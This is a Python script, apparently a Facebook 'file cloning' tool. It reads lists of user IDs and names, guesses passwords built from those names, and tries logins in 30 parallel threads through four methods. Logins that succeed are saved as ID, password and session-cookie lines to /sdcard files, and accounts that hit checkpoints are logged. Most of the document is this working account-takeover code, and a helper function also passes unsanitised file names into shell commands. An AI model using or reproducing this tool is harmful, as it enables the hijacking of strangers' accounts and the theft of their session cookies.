...
os.system('clear')
print ('Ruka ek sec...\n')
os.system('xdg-open https://m.facebook.com/groups/727352689572738/')
...
from concurrent.futures import ThreadPoolExecutor as GaneshGanesh
from string import * 
...
sys.stdout.write('\x1b]2; Ganesh\x07')
S = '\033[1;32;40m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
os.system('espeak -a 100 " Welcome,   to,  Ganesh file cloning  Tools"')
logo =                                          """            
...
▀▄▄▄▄▄▀▄▄▀▄▄▀▄▄▄▀▀▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▀▄▀
\033[1;32;40m-----------------------------------------------
\033[1;32;40m Owner   :   GANESH HERØ
\033[1;32;40m Facebook:   GANESH HERØ
\033[1;32;40m Version :   1.1.1
\033[1;32;40m status :    💲Free💸
\033[1;32;40m announcement : Only File cloning is working
\033[1;32;40m use method:one
\033[1;32;40m------------------------------------------------ """
def clear():
    os.system("clear")
    print(logo)    
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back Ganesh Menu ")
        exit()
...
def Ganesh():   
    ...
    if select =='1':
        ...
        os.system('xdg-open https://www.facebook.com/iam.09ganesh.yadav?mibextid=kFxxJD')
        pass
    elif select =='F':
        os.system('')
    else:
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Ganesh] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);Ganeshb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={Ganeshb};{ckkk}"
                    print(f"\r{R} [Ganesh-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/Ganesh_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Ganesh_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [Ganesh-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/Ganesh_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Ganesh] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [Ganesh-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/Ganesh_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Ganesh_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [Ganesh-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Ganesh] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[Ganesh] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [Ganesh-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/Ganesh_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with GaneshGanesh(max_workers=30) as Ganeshworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                Ganeshworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                Ganeshworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                Ganeshworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                Ganeshworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/Ganesh.txt') 
        print(47*"-")
...
def sids():
    ...
    try:
        ...
        exit()
    clear()
    print('\033[1;32;40mPut limit between 1 to 10 \033[0;97m')
    limit = int(input('How many links do you want to separate?: '))
    clear()
    print('\033[1;32;40mExample: /sdcard/Ganesh.txt\033[0;97m')
    print(47*'-')
    new_save = input('Save new file as: ')
    clear()
    print('\033[1;32;40mExample: 10008,10007,10006')
    print(47*'-')
    y = 0
...
def cutter():
    ...
    Ganesh = input('Put File Name :')
    print(" ")
    Ganesh = input('Saving Put File Name :')
    os.system('touch ' +Ganesh)
    os.system('sort -r '+Ganesh+' | uniq > '+Ganesh)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + Ganesh )
    print(47*'-')
    print("File Saved To :" + Ganesh )
    print(47*'-')
    input(f"{S} Press Enter To Back Ganesh Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/Ganesh.txt\n') 
        filepath = input("Put File Name: ")
